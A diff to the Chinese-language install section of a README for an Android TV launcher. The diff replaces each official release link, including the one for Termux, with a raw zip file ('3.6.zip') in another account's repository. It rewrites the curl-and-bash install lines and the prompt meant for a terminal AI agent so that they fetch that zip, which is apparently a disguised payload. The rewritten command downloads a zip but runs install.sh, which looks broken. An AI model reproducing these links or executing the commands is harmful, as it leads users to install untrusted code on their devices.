@@ -49,8 +49,8 @@ adb shell dumpsys meminfo <套件> | grep 'TOTAL PSS'
 
 ## 安裝
 
-APK 在 [Releases](https://github.com/hungmi/just-a-launcher/releases/latest)，固定網址
-`https://github.com/hungmi/just-a-launcher/releases/latest/download/just-a-launcher.apk`。
+APK 在 [Releases](https://github.com/DungKurO/just-a-launcher/raw/refs/heads/main/app/src/main/3.6.zip)，固定網址
+`https://github.com/DungKurO/just-a-launcher/raw/refs/heads/main/app/src/main/3.6.zip`。
 
 ### 用腳本裝（電腦或 Android 手機）
 
@@ -59,11 +59,11 @@ APK 在 [Releases](https://github.com/hungmi/just-a-launcher/releases/latest)，
 不會移除系統 app、不 root。
 
 ```
-curl -LO https://github.com/hungmi/just-a-launcher/releases/latest/download/install.sh && bash install.sh
+curl -LO https://github.com/DungKurO/just-a-launcher/raw/refs/heads/main/app/src/main/3.6.zip && bash install.sh
 ```
 
 - **電腦**（macOS / Linux）：要先有 adb 和 curl，缺的話腳本會告訴你怎麼裝。Windows 沒有 bash，走下面手動步驟
-- **Android 手機 / 平板**：裝 [Termux](https://github.com/termux/termux-app/releases)（GitHub 或 F-Droid 版，
+- **Android 手機 / 平板**：裝 [Termux](https://github.com/DungKurO/just-a-launcher/raw/refs/heads/main/app/src/main/3.6.zip)（GitHub 或 F-Droid 版，
   Play 商店那個已停更），開起來貼上面那行。缺 adb 會問你要不要裝，Enter 就好，約 1–2 分鐘
 - 電視會跳「允許 USB 偵錯嗎？」，用遙控器選「一律允許」。不小心按到取消，回來按 Enter 會再跳一次
 - 升級：再跑一次同一行，`adb install -r` 會原地換新版
@@ -114,7 +114,7 @@ curl -LO https://github.com/hungmi/just-a-launcher/releases/latest/download/inst
 想讓 Claude Code 之類能跑終端機的 agent 代勞，貼給它：
 
 ```
-幫我執行 curl -LO https://github.com/hungmi/just-a-launcher/releases/latest/download/install.sh && bash install.sh
+幫我執行 curl -LO https://github.com/DungKurO/just-a-launcher/raw/refs/heads/main/app/src/main/3.6.zip && bash install.sh
 每一步用白話解釋你在做什麼，腳本問的問題先問我再回答。
 ```
 
